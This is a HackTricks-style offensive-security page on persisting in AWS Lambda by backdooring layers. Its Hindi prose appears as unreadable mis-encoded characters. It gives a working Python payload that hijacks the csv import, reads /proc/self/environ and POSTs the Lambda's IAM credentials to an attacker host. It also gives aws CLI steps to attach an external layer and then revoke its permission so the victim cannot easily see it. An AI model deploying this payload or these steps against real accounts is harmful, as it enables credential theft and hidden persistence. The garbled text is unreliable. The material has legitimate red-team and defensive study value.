# AWS - Lambda Layers Persistence

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВред

</details>
{% endhint %}

## Lambda Layers

рдПрдХ Lambda рд▓реЗрдпрд░ рдПрдХ .zip рдлрд╝рд╛рдЗрд▓ рдЖрд░реНрдХрд╛рдЗрд╡ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рдЕрддрд┐рд░рд┐рдХреНрдд рдХреЛрдб** рдпрд╛ рдЕрдиреНрдп рд╕рд╛рдордЧреНрд░реА рд╣реЛ рд╕рдХрддреА рд╣реИред рдПрдХ рд▓реЗрдпрд░ рдореЗрдВ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЗрдВ, [рдХрд╕реНрдЯрдо рд░рдирдЯрд╛рдЗрдо](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-custom.html), рдбреЗрдЯрд╛, рдпрд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВред

рдПрдХ **рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рдкрд╛рдВрдЪ рд▓реЗрдпрд░реНрд╕** рд╢рд╛рдорд┐рд▓ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЬрдм рдЖрдк рдПрдХ рд▓реЗрдпрд░ рдХреЛ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ **рд╕рд╛рдордЧреНрд░реА** рдХреЛ **рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдкрд░рд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ `/opt`** рддрдХ рдирд┐рдХрд╛рд▓ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд░реВрдк рд╕реЗ, рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдП рдЧрдП **рд▓реЗрдпрд░реНрд╕** рдЖрдкрдХреЗ AWS рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП **рдирд┐рдЬреА** рд╣реЛрддреЗ рд╣реИрдВред рдЖрдк рдПрдХ рд▓реЗрдпрд░ рдХреЛ рдЕрдиреНрдп рдЦрд╛рддреЛрдВ рдХреЗ рд╕рд╛рде **рд╕рд╛рдЭрд╛** рдХрд░рдиреЗ рдпрд╛ рд▓реЗрдпрд░ рдХреЛ **рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ** рдмрдирд╛рдиреЗ рдХрд╛ рд╡рд┐рдХрд▓реНрдк рдЪреБрди рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдкрдХреЗ рдлрд╝рдВрдХреНрд╢рди рдПрдХ рдРрд╕реА рд▓реЗрдпрд░ рдХрд╛ рдЙрдкрднреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдХрд┐рд╕реА рдЕрд▓рдЧ рдЦрд╛рддрд╛ рдиреЗ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд┐рдпрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЗ рдлрд╝рдВрдХреНрд╢рди рд▓реЗрдпрд░ рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рддрдХ рдЙрд╕реЗ рд╣рдЯрд╛ рдирд╣реАрдВ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрд╛ рдЬрдм рддрдХ рдЖрдкрдХреА рд▓реЗрдпрд░ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╡рд╛рдкрд╕ рд▓реА рдЧрдИ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рдирдП рдлрд╝рдВрдХреНрд╢рди рдирд╣реАрдВ рдмрдирд╛ рд╕рдХрддреЗ рдпрд╛ рд╣рдЯрд╛рдП рдЧрдП рд▓реЗрдпрд░ рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЕрдкрдбреЗрдЯ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред

рдХрдВрдЯреЗрдирд░ рдЫрд╡рд┐ рдХреЗ рд░реВрдк рдореЗрдВ рдбрд┐рдкреНрд▓реЙрдп рдХрд┐рдП рдЧрдП рдлрд╝рдВрдХреНрд╢рди рд▓реЗрдпрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рддреЗред рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, рдЬрдм рдЖрдк рдЫрд╡рд┐ рдмрдирд╛рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЕрдкрдиреЗ рдкрд╕рдВрджреАрджрд╛ рд░рдирдЯрд╛рдЗрдо, рдкреБрд╕реНрддрдХрд╛рд▓рдпреЗрдВ, рдФрд░ рдЕрдиреНрдп рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ рдЫрд╡рд┐ рдореЗрдВ рдкреИрдХреЗрдЬ рдХрд░рддреЗ рд╣реИрдВред

### Python рд▓реЛрдб рдкрде

Python рджреНрд╡рд╛рд░рд╛ рд▓реИрдореНрдмрдбрд╛ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рд▓реЛрдб рдкрде рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИ:
```
['/var/task', '/opt/python/lib/python3.9/site-packages', '/opt/python', '/var/runtime', '/var/lang/lib/python39.zip', '/var/lang/lib/python3.9', '/var/lang/lib/python3.9/lib-dynload', '/var/lang/lib/python3.9/site-packages', '/opt/python/lib/python3.9/site-packages']
```
**рджреВрд╕рд░реЗ** рдФрд░ рддреАрд╕рд░реЗ **рд╕реНрдерд╛рдиреЛрдВ** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдЬрд╣рд╛рдВ **рд▓реИрдореНрдмрдбрд╛ рд▓реЗрдпрд░** рдЕрдкрдиреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдирдЬрд╝рд┐рдк рдХрд░рддреА рд╣реИрдВ: **`/opt/python/lib/python3.9/site-packages`** рдФрд░ **`/opt/python`**

{% hint style="danger" %}
рдпрджрд┐ рдХрд┐рд╕реА рд╣рдорд▓рд╛рд╡рд░ рдиреЗ рдПрдХ рдкреНрд░рдпреЛрдЧ рдХрд┐рдпрд╛ рд▓реИрдореНрдмрдбрд╛ **рд▓реЗрдпрд░** рдХреЛ **рдмреИрдХрдбреЛрд░** рдХрд░рдиреЗ рдХрд╛ рдпрд╛ **рдПрдХ рдЬреЛрдбрд╝ рджрд┐рдпрд╛** рдЬреЛ **рд╕рд╛рдорд╛рдиреНрдп рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рд╣реЛрдиреЗ рдкрд░ рдПрдХрд╛рдзрд┐рдХ рдХреЛрдб рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рдХрд░реЗрдЧрд╛**, рддреЛ рдЙрд╕реЗ рдкреНрд░рддреНрдпреЗрдХ рд▓реИрдореНрдмрдбрд╛ рдЖрд╡рд╛рд╣рди рдХреЗ рд╕рд╛рде рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдЧреАред
{% endhint %}

рдЗрд╕рд▓рд┐рдП, рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ рд╣реИрдВ:

* **рдЬрд╛рдВрдЪреЗрдВ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ** рдХреЛ рдЬреЛ **рд╢рд┐рдХрд╛рд░ рдХреЛ рд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**
* рдПрдХ **рдкреНрд░реЙрдХреНрд╕реА рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рд╕рд╛рде рд▓реИрдореНрдмрдбрд╛ рд▓реЗрдпрд░** рдмрдирд╛рдПрдВ рдЬреЛ **рдХрд╕реНрдЯрдо рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛** рдФрд░ **рдореВрд▓** рдкреБрд╕реНрддрдХрд╛рд▓рдп **рд▓реЛрдб рдХрд░реЗрдЧрд╛**ред

### рдкреВрд░реНрд╡-рд▓реЛрдб рдХреА рдЧрдИ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЗрдВ

{% hint style="warning" %}
рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп рдореБрдЭреЗ рдПрдХ рдХрдард┐рдирд╛рдИ рдорд┐рд▓реА: рдХреБрдЫ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЗрдВ **рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд▓реЛрдб рд╣реЛ рдЬрд╛рддреА рд╣реИрдВ** рдкрд╛рдЗрдерди рд░рдирдЯрд╛рдЗрдо рдореЗрдВ рдЬрдм рдЖрдкрдХрд╛ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИред рдореИрдВ `os` рдпрд╛ `sys` рдЬреИрд╕реА рдЪреАрдЬреЗрдВ рдвреВрдВрдв рд░рд╣рд╛ рдерд╛, рд▓реЗрдХрд┐рди **рд╣рд╛рд▓рд╛рдВрдХрд┐ `json` рдкреБрд╕реНрддрдХрд╛рд▓рдп рднреА рд▓реЛрдб рд╣реЛ рдЧрдИ рдереА**ред\
рдЗрд╕ рд╕реНрдерд╛рдпрд┐рддреНрд╡ рддрдХрдиреАрдХ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдХреЛрдб рдХреЛ рдПрдХ рдирдпрд╛ рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬреЛ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рдкрд░ рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред
{% endhint %}

рдЗрд╕ рддрд░рд╣ рдХреЗ рдПрдХ рдкрд╛рдпрдерди рдХреЛрдб рдХреЗ рд╕рд╛рде, рдкреЙрдЗрдерди рд░рдирдЯрд╛рдЗрдо рдХреЗ рдЕрдВрджрд░ рдкреВрд░реНрд╡-рд▓реЛрдб рдХреА рдЧрдИ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреА **рд╕реВрдЪреА рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ**:
```python
import sys

def lambda_handler(event, context):
return {
'statusCode': 200,
'body': str(sys.modules.keys())
}
```
рдФрд░ рдпрд╣ рд╣реИ **рд╕реВрдЪреА** (рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ `os` рдпрд╛ `json` рдЬреИрд╕реА рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЙрдкрд╕реНрдерд┐рдд рд╣реИрдВ)
```
'sys', 'builtins', '_frozen_importlib', '_imp', '_thread', '_warnings', '_weakref', '_io', 'marshal', 'posix', '_frozen_importlib_external', 'time', 'zipimport', '_codecs', 'codecs', 'encodings.aliases', 'encodings', 'encodings.utf_8', '_signal', 'encodings.latin_1', '_abc', 'abc', 'io', '__main__', '_stat', 'stat', '_collections_abc', 'genericpath', 'posixpath', 'os.path', 'os', '_sitebuiltins', 'pwd', '_locale', '_bootlocale', 'site', 'types', 'enum', '_sre', 'sre_constants', 'sre_parse', 'sre_compile', '_heapq', 'heapq', 'itertools', 'keyword', '_operator', 'operator', 'reprlib', '_collections', 'collections', '_functools', 'functools', 'copyreg', 're', '_json', 'json.scanner', 'json.decoder', 'json.encoder', 'json', 'token', 'tokenize', 'linecache', 'traceback', 'warnings', '_weakrefset', 'weakref', 'collections.abc', '_string', 'string', 'threading', 'atexit', 'logging', 'awslambdaric', 'importlib._bootstrap', 'importlib._bootstrap_external', 'importlib', 'awslambdaric.lambda_context', 'http', 'email', 'email.errors', 'binascii', 'email.quoprimime', '_struct', 'struct', 'base64', 'email.base64mime', 'quopri', 'email.encoders', 'email.charset', 'email.header', 'math', '_bisect', 'bisect', '_random', '_sha512', 'random', '_socket', 'select', 'selectors', 'errno', 'array', 'socket', '_datetime', 'datetime', 'urllib', 'urllib.parse', 'locale', 'calendar', 'email._parseaddr', 'email.utils', 'email._policybase', 'email.feedparser', 'email.parser', 'uu', 'email._encoded_words', 'email.iterators', 'email.message', '_ssl', 'ssl', 'http.client', 'runtime_client', 'numbers', '_decimal', 'decimal', '__future__', 'simplejson.errors', 'simplejson.raw_json', 'simplejson.compat', 'simplejson._speedups', 'simplejson.scanner', 'simplejson.decoder', 'simplejson.encoder', 'simplejson', 'awslambdaric.lambda_runtime_exception', 'awslambdaric.lambda_runtime_marshaller', 'awslambdaric.lambda_runtime_client', 'awslambdaric.bootstrap', 'awslambdaric.__main__', 'lambda_function'
```
рдФрд░ рдпрд╣ рд╣реИ **рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ** рдХреА рд╕реВрдЪреА рдЬреЛ **рд▓реИрдореНрдмрдбрд╛ рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рд╣реИрдВ**: [https://gist.github.com/gene1wood/4a052f39490fae00e0c3](https://gist.github.com/gene1wood/4a052f39490fae00e0c3)

### рд▓реИрдореНрдмрдбрд╛ рд▓реЗрдпрд░ рдмреИрдХрдбреЛрд░рд┐рдВрдЧ

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдпрд╣ рдорд╛рди рд▓реЗрддреЗ рд╣реИрдВ рдХрд┐ рд▓рдХреНрд╖рд┐рдд рдХреЛрдб **`csv`** рдХреЛ рдЖрдпрд╛рдд рдХрд░ рд░рд╣рд╛ рд╣реИред рд╣рдо **`csv` рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдЖрдпрд╛рдд рдХреЛ рдмреИрдХрдбреЛрд░ рдХрд░рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ**ред

рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ **csv рдирд╛рдордХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдмрдирд╛рдиреА рд╣реЛрдЧреА** рдЬрд┐рд╕рдореЗрдВ рдлрд╝рд╛рдЗрд▓ **`__init__.py`** рд╣реЛрдЧреА рдФрд░ рдЗрд╕реЗ рдПрдХ рдкрде рдореЗрдВ рдмрдирд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдЬреЛ рд▓реИрдореНрдмрдбрд╛ рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ: **`/opt/python/lib/python3.9/site-packages`**\
рдлрд┐рд░, рдЬрдм рд▓реИрдореНрдмрдбрд╛ рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ **csv** рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╣рдорд╛рд░реА **`__init__.py` рдлрд╝рд╛рдЗрд▓ рд▓реЛрдб рдХреА рдЬрд╛рдПрдЧреА рдФрд░ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХреА рдЬрд╛рдПрдЧреА**ред\
рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП:

* рд╣рдорд╛рд░реЗ рдкреЗрд▓реЛрдб рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░реЗрдВ
* рдореВрд▓ csv рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рд▓реЛрдб рдХрд░реЗрдВ

рд╣рдо рджреЛрдиреЛрдВ рдХреЛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
import sys
from urllib import request

with open("/proc/self/environ", "rb") as file:
url= "https://attacker13123344.com/" #Change this to your server
req = request.Request(url, data=file.read(), method="POST")
response = request.urlopen(req)

# Remove backdoor directory from path to load original library
del_path_dir = "/".join(__file__.split("/")[:-2])
sys.path.remove(del_path_dir)

# Remove backdoored loaded library from sys.modules
del sys.modules[__file__.split("/")[-2]]

# Load original library
import csv as _csv

sys.modules["csv"] = _csv
```
Then, create a zip with this code in the path **`python/lib/python3.9/site-packages/__init__.py`** and add it as a lambda layer.

You can find this code in [**https://github.com/carlospolop/LambdaLayerBackdoor**](https://github.com/carlospolop/LambdaLayerBackdoor)

The integrated payload will **send the IAM creds to a server THE FIRST TIME it's invoked or AFTER a reset of the lambda container** (change of code or cold lambda), but **other techniques** such as the following could also be integrated:

{% content-ref url="../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

### External Layers

Note that it's possible to use **lambda layers from external accounts**. Moreover, a lambda can use a layer from an external account even if it doesn't have permissions.\
Also note that the **max number of layers a lambda can have is 5**.

Therefore, in order to improve the versatility of this technique an attacker could:

* Backdoor an existing layer of the user (nothing is external)
* **Create** a **layer** in **his account**, give the **victim account access** to use the layer, **configure** the **layer** in victims Lambda and **remove the permission**.
* The **Lambda** will still be able to **use the layer** and the **victim won't** have any easy way to **download the layers code** (apart from getting a rev shell inside the lambda)
* The victim **won't see external layers** used with **`aws lambda list-layers`**

{% code overflow="wrap" %}
```bash
# Upload backdoor layer
aws lambda publish-layer-version --layer-name "ExternalBackdoor" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"

# Give everyone access to the lambda layer
## Put the account number in --principal to give access only to an account
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion

## Add layer to victims Lambda

# Remove permissions
aws lambda remove-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1
```
{% endcode %}

{% hint style="success" %}
рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ GCP рд╣реИрдХрд┐рдВрдЧ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рдЧреНрд░реБрдк**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рдЧреНрд░реБрдк**](https://t.me/peass) рдпрд╛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВред

</details>
{% endhint %}
